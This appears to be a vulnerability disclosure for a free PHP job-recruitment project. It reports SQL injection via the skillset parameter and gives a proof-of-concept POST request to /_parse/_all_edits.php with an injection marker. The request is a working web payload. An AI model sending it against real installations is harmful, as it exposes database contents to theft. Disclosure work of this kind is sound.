# job-recruitment-in-php has sql injection vulnerability in skillset parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
skillset parameter. 



## describe

An unrestricted SQL injection attack exists in a job-recruitmentsystem. The parameters that can be controlled are as follows: skillset parameter This function executes the skillset parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of skillset is obtained in add_xp action , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241224233706289](https://github.com/user-attachments/assets/abdec9d4-df82-4273-bdec-3b84eb918e38)



## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencodedz
Content-Length: 17
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=8dupfdh7itn07vib4qplosg4dv
Upgrade-Insecure-Requests: 1
Priority: u=0, i

skillset%5B%5D=1*
```

**Result**

![image-20241224233632120](https://github.com/user-attachments/assets/a4642677-e12b-4e60-920f-90593e150d48)

Get tables

![image-20241213201627253](https://github.com/user-attachments/assets/4314c675-b9dd-4809-9aca-eb525b3e3326)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤